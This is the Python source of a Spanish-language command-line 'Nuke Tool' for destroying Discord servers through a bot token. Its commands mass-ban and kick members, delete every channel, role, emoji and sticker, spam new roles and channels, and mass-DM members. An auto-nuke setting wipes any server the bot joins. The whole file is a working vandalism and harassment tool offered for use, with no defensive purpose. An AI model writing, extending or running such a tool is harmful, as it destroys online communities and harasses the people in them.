#!/usr/bin/env python3
"""Nuke Tool - herramienta de destruccion de servidores Discord para Termux."""
from __future__ import annotations

import asyncio
import sys
import time

import discord

from src import ui
from src.config import load_config, save_config
from src.modules import channels, extras, members, nuke, roles
from src.modules.utils import human

VERSION = "1.0.0"

try:
    import colorama

    colorama.just_fix_windows_console()
except Exception:
    pass

CONFIG = load_config()

STATE = {
    "client": None,
    "guild_id": CONFIG.get("default_guild") or None,
    "busy": False,
    "auto_nuke": bool(CONFIG.get("auto_nuke")),
}

PROMPT = "  " + ui.C.BRAND + "\u276f " + ui.RESET


# ───────────────────────── helpers ─────────────────────────

def current_guild():
    client = STATE["client"]
    if not client:
        return None
    if STATE["guild_id"]:
        guild = client.get_guild(int(STATE["guild_id"])) if str(STATE["guild_id"]).isdigit() else None
        if guild:
            return guild
    return next(iter(client.guilds), None)


def require_guild():
    guild = current_guild()
    if not guild:
        ui.error('No hay servidor seleccionado. Usa "guilds" y luego "use <numero>".')
        return None
    return guild


def require_client() -> bool:
    if not STATE["client"]:
        ui.error("Primero conecta el bot con: login <TOKEN>")
        return False
    return True


class busy:
    """Contexto que bloquea operaciones simultaneas y muestra un spinner."""

    def __init__(self, label: str):
        self.label = label
        self.spinner = None

    async def __aenter__(self):
        if STATE["busy"]:
            ui.warn("Ya hay una operacion en curso.")
            return False
        STATE["busy"] = True
        self.spinner = ui.Spinner(self.label).start()
        return True

    async def __aexit__(self, exc_type, exc, tb):
        STATE["busy"] = False
        if self.spinner:
            self.spinner.stop()
        if exc:
            ui.error(f"Fallo: {exc}")
            return True
        return False


# ───────────────────────── cliente ─────────────────────────

def create_client() -> discord.Client:
    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True
    intents.voice_states = True
    intents.emojis_and_stickers = True

    client = discord.Client(intents=intents, chunk_guilds_at_startup=True)

    @client.event
    async def on_ready():
        ui.ok(f"Conectado como {client.user}")

    @client.event
    async def on_guild_join(guild: discord.Guild):
        if not STATE["auto_nuke"]:
            return
        ui.info(f"Auto-nuke activado -> entrando a {guild.name}")
        try:
            await nuke.full_nuke(guild, client, **CONFIG["nuke"], log=ui.step)
            ui.ok(f"Auto-nuke terminado en {guild.name}")
        except Exception as exc:
            ui.error(f"Auto-nuke fallo: {exc}")

    return client


async def login(token: str) -> None:
    if STATE["client"]:
        ui.warn('Ya hay una sesion activa. Usa "logout" primero.')
        return

    client = create_client()
    error: list = []

    async def starter():
        try:
            await client.start(token)
        except Exception as exc:  # token invalido, etc.
            error.append(exc)

    task = asyncio.create_task(starter())
    deadline = time.time() + 60

    while time.time() < deadline:
        if client.is_ready():
            break
        if error:
            ui.error(f"Login fallido: {error[0]}")
            task.cancel()
            return
        await asyncio.sleep(0.25)
    else:
        ui.error("Timeout de conexion (60s).")
        task.cancel()
        return

    STATE["client"] = client
    CONFIG["token"] = token
    save_config(CONFIG)

    ui.ok(f"Sesion iniciada: {client.user}")
    ui.kv("Servidores", human(len(client.guilds)))
    ui.plain('Usa "guilds" para listarlos y "use <numero>" para elegir uno.')


# ───────────────────────── comandos ─────────────────────────

COMMANDS: dict = {}


def command(name, desc, aliases=()):
    def deco(fn):
        entry = {"name": name, "desc": desc, "fn": fn}
        COMMANDS[name] = entry
        for alias in aliases:
            COMMANDS[alias] = entry
        return fn
    return deco


@command("help", "Muestra la lista de comandos", aliases=("?",))
async def cmd_help(_rest=""):
    groups = {
        "Sesion": ["login", "logout", "token", "guilds", "use", "info"],
        "Destruccion": ["nuke", "banall", "kickall", "nickall", "dmall"],
        "Roles": ["roledestroy", "rolespam", "roleall"],
        "Canales": ["chandestroy", "chanspam"],
        "Extras": ["emojidestroy", "stickerdestroy", "vcdisconnect", "status",
                   "auto", "config", "rename", "renamebot", "clear"],
    }
    ui.title("Comandos")
    for group, names in groups.items():
        print()
        print("  " + ui.C.BOLD + ui.C.BRAND + group + ui.RESET)
        for n in names:
            entry = COMMANDS.get(n)
            if not entry:
                continue
            print("  " + ui.C.BRAND + ("  " + n).ljust(17) + ui.RESET
                  + ui.C.MUTED + entry["desc"] + ui.RESET)
    print()
    print("  " + ui.C.MUTED + "Los argumentos con espacios se escriben tal cual: "
          + ui.RESET + ui.C.BRAND + "rename Mi Servidor" + ui.RESET)
    print()


@command("token", "Guarda el token sin conectar")
async def cmd_token(rest=""):
    if not rest:
        return ui.warn("Uso: token <TOKEN>")
    CONFIG["token"] = rest.strip()
    save_config(CONFIG)
    ui.ok("Token guardado en config.json")


@command("login", "Conecta el bot (login [TOKEN])", aliases=("start", "connect"))
async def cmd_login(rest=""):
    token = rest.strip() or CONFIG.get("token")
    if not token:
        return ui.warn("Uso: login <TOKEN>")
    await login(token)


@command("logout", "Desconecta el bot")
async def cmd_logout(_rest=""):
    client = STATE["client"]
    if not client:
        return ui.warn("No hay sesion activa.")
    await client.close()
    STATE["client"] = None
    ui.ok("Sesion cerrada.")


@command("guilds", "Lista los servidores disponibles", aliases=("servers",))
async def cmd_guilds(_rest=""):
    if not require_client():
        return
    guilds = list(STATE["client"].guilds)
    if not guilds:
        return ui.warn("El bot no esta en ningun servidor.")
    ui.title("Servidores")
    for i, guild in enumerate(guilds, start=1):
        mark = ui.C.OK + " \u25c0 actual" + ui.RESET if str(guild.id) == str(STATE["guild_id"]) else ""
        ui.table_row(i, guild.name, f"  ({human(guild.member_count or 0)} miembros)" + mark)
    print()


@command("use", "Selecciona un servidor por numero o ID", aliases=("select",))
async def cmd_use(rest=""):
    if not require_client():
        return
    arg = rest.strip()
    if not arg:
        return ui.warn("Uso: use <numero|ID>")

    guilds = list(STATE["client"].guilds)
    target = None
    if arg.isdigit() and 1 <= int(arg) <= len(guilds):
        target = guilds[int(arg) - 1]
    else:
        target = STATE["client"].get_guild(int(arg)) if arg.isdigit() else None
    if not target:
        return ui.error("Servidor no encontrado.")

    STATE["guild_id"] = target.id
    CONFIG["default_guild"] = str(target.id)
    save_config(CONFIG)
    ui.ok(f"Servidor activo: {target.name}")


@command("info", "Informacion del servidor activo")
async def cmd_info(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Recopilando datos...") as go:
        if not go:
            return
        members_list = await members.fetch_all_members(guild)
        owner = guild.owner or (await guild.fetch_member(guild.owner_id) if guild.owner_id else None)
        ui.title("Servidor")
        ui.kv("Nombre", guild.name)
        ui.kv("ID", guild.id)
        ui.kv("Owner", owner.user if owner else "desconocido")
        ui.kv("Miembros", human(len(members_list)))
        ui.kv("Canales", human(len(guild.channels)))
        ui.kv("Roles", human(len(guild.roles)))
        ui.kv("Emojis", human(len(guild.emojis)))
        ui.kv("Stickers", human(len(guild.stickers)))
        ui.kv("Boost", f"nivel {guild.premium_tier}")
        print()


@command("nuke", "Destruccion total del servidor", aliases=("destroy", "full"))
async def cmd_nuke(_rest=""):
    guild = require_guild()
    if not guild or not require_client():
        return
    async with busy("Nukeando el servidor...") as go:
        if not go:
            return
        report = await nuke.full_nuke(guild, STATE["client"], **CONFIG["nuke"], log=ui.step)
    ui.title("Reporte")
    for key, value in report.items():
        ui.kv(key, value)
    print()


@command("banall", "Banea a todos los miembros", aliases=("ban",))
async def cmd_banall(rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Baneando miembros...") as go:
        if not go:
            return
        n = await members.ban_all(guild, STATE["client"], reason=rest or "nuke",
                                  concurrency=CONFIG["nuke"]["concurrency"], log=ui.step)
    ui.ok(f"{human(n)} miembros baneados.")


@command("kickall", "Expulsa a todos los miembros", aliases=("kick",))
async def cmd_kickall(rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Expulsando miembros...") as go:
        if not go:
            return
        n = await members.kick_all(guild, STATE["client"], reason=rest or "nuke", log=ui.step)
    ui.ok(f"{human(n)} miembros expulsados.")


@command("nickall", "Cambia el nick de todos", aliases=("renameall",))
async def cmd_nickall(rest=""):
    guild = require_guild()
    if not guild:
        return
    nick = rest or "nuked"
    async with busy("Renombrando miembros...") as go:
        if not go:
            return
        n = await members.nick_all(guild, nick, log=ui.step)
    ui.ok(f'{human(n)} nicks cambiados a "{nick}".')


@command("dmall", "Envia un DM a todos")
async def cmd_dmall(rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Enviando mensajes...") as go:
        if not go:
            return
        n = await members.dm_all(guild, rest or "Nuked.", log=ui.step)
    ui.ok(f"{human(n)} DMs enviados.")


@command("rename", "Renombra el servidor", aliases=("guildname",))
async def cmd_rename(rest=""):
    guild = require_guild()
    if not guild:
        return
    if not rest:
        return ui.warn("Uso: rename <nuevo nombre>")
    try:
        await guild.edit(name=rest[:100], reason="nuke")
        ui.ok(f'Servidor renombrado a "{rest}"')
    except Exception as exc:
        ui.error(str(exc))


@command("renamebot", "Renombra el bot (max 2/hora)", aliases=("botname",))
async def cmd_renamebot(rest=""):
    if not require_client():
        return
    if not rest:
        return ui.warn("Uso: renamebot <nuevo nombre>")
    try:
        await STATE["client"].user.edit(username=rest)
        ui.ok(f'Bot renombrado a "{rest}"')
    except Exception as exc:
        ui.error(str(exc))


@command("roledestroy", "Borra todos los roles", aliases=("roledel",))
async def cmd_roledestroy(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Borrando roles...") as go:
        if not go:
            return
        n = await roles.destroy_roles(guild, log=ui.step)
    ui.ok(f"{human(n)} roles borrados.")


@command("rolespam", "Crea N roles")
async def cmd_rolespam(rest=""):
    guild = require_guild()
    if not guild:
        return
    count = int(rest) if rest.strip().isdigit() else 10
    async with busy("Creando roles...") as go:
        if not go:
            return
        n = await roles.spam_roles(guild, count, log=ui.step)
    ui.ok(f"{human(n)} roles creados.")


@command("roleall", "Da un rol a todos los miembros")
async def cmd_roleall(rest=""):
    guild = require_guild()
    if not guild:
        return
    name = rest.strip().lower()
    role = discord.utils.find(lambda r: r.name.lower() == name, guild.roles)
    if not role:
        return ui.error("Rol no encontrado. Uso: roleall <nombre del rol>")
    async with busy("Asignando rol...") as go:
        if not go:
            return
        n = await roles.give_role_to_all(guild, role.id, log=ui.step)
    ui.ok(f"Rol asignado a {human(n)} miembros.")


@command("chandestroy", "Borra todos los canales", aliases=("chandel",))
async def cmd_chandestroy(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Borrando canales...") as go:
        if not go:
            return
        n = await channels.destroy_channels(guild, log=ui.step)
    ui.ok(f"{human(n)} canales borrados.")


@command("chanspam", "Crea N canales (chanspam [n] [text|voice])")
async def cmd_chanspam(rest=""):
    guild = require_guild()
    if not guild:
        return
    parts = rest.split()
    count = int(parts[0]) if parts and parts[0].isdigit() else 10
    kind = "voice" if len(parts) > 1 and parts[1] == "voice" else "text"
    async with busy("Creando canales...") as go:
        if not go:
            return
        n = await channels.spam_channels(guild, count, kind=kind, log=ui.step)
    ui.ok(f"{human(n)} canales de {kind} creados.")


@command("emojidestroy", "Borra todos los emojis")
async def cmd_emojidestroy(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Borrando emojis...") as go:
        if not go:
            return
        n = await extras.delete_emojis(guild, log=ui.step)
    ui.ok(f"{human(n)} emojis borrados.")


@command("stickerdestroy", "Borra todos los stickers")
async def cmd_stickerdestroy(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Borrando stickers...") as go:
        if not go:
            return
        n = await extras.delete_stickers(guild, log=ui.step)
    ui.ok(f"{human(n)} stickers borrados.")


@command("vcdisconnect", "Saca a todos de los canales de voz", aliases=("vckick",))
async def cmd_vcdisconnect(_rest=""):
    guild = require_guild()
    if not guild:
        return
    async with busy("Desconectando de voz...") as go:
        if not go:
            return
        n = await extras.disconnect_voice(guild, log=ui.step)
    ui.ok(f"{human(n)} usuarios desconectados.")


@command("status", "Cambia el estado del bot (status [tipo] <texto>)")
async def cmd_status(rest=""):
    if not require_client():
        return
    types = list(extras.ACTIVITY_TYPES)
    parts = rest.split()
    kind = parts.pop(0) if parts and parts[0] in types else "playing"
    text = " ".join(parts) or "nuking servers"
    await extras.set_status(STATE["client"], text, kind)
    ui.ok(f"Estado actualizado: {kind} {text}")


@command("auto", "Nuke automatico al entrar a un servidor (auto on|off)", aliases=("autonuke",))
async def cmd_auto(rest=""):
    value = rest.strip().lower() in ("on", "true", "1", "si", "yes")
    STATE["auto_nuke"] = value
    CONFIG["auto_nuke"] = value
    save_config(CONFIG)
    ui.ok(f"Auto-nuke {'activado' if value else 'desactivado'}.")


@command("config", "Muestra o edita la configuracion del nuke")
async def cmd_config(rest=""):
    parts = rest.split()
    if not parts:
        ui.title("Configuracion")
        for key, value in CONFIG["nuke"].items():
            ui.kv(key, value)
        print()
        return

    key, *value_parts = parts
    value = " ".join(value_parts)
    if key not in CONFIG["nuke"]:
        return ui.error(f"Clave desconocida: {key}")

    current = CONFIG["nuke"][key]
    if isinstance(current, bool):
        CONFIG["nuke"][key] = value.lower() in ("true", "on", "1", "si", "yes")
    elif isinstance(current, int):
        CONFIG["nuke"][key] = int(value) if value.lstrip("-").isdigit() else current
    else:
        CONFIG["nuke"][key] = value
    save_config(CONFIG)
    ui.ok(f"{key} = {CONFIG['nuke'][key]}")


@command("clear", "Limpia la pantalla")
async def cmd_clear(_rest=""):
    ui.print_banner(VERSION)


@command("exit", "Sale del programa", aliases=("quit", "q"))
async def cmd_exit(_rest=""):
    if STATE["client"]:
        await STATE["client"].close()
    ui.ok("Hasta luego.")
    sys.exit(0)


# ───────────────────────── REPL ─────────────────────────

async def handle(line: str) -> None:
    name = line.split()[0].lower()
    rest = line[len(name):].strip()
    entry = COMMANDS.get(name)

    if not entry:
        ui.error(f'Comando desconocido: {name}. Escribe "help".')
        return

    await entry["fn"](rest)


async def repl() -> None:
    while True:
        try:
            line = await asyncio.to_thread(input, PROMPT)
        except EOFError:
            break
        except KeyboardInterrupt:
            print()
            break

        line = line.strip()
        if not line:
            continue

        try:
            await handle(line)
        except SystemExit:
            raise
        except Exception as exc:
            ui.error(f"{type(exc).__name__}: {exc}")


async def run() -> None:
    ui.print_banner(VERSION)

    if CONFIG.get("token"):
        ui.info("Token detectado en config.json, conectando...")
        await login(CONFIG["token"])
    else:
        ui.warn("Sin token. Usa: login <TOKEN>")

    try:
        await repl()
    finally:
        if STATE["client"]:
            await STATE["client"].close()
            ui.plain("Cliente desconectado.")


def main() -> None:
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print()
        ui.ok("Hasta luego.")


if __name__ == "__main__":
    main()
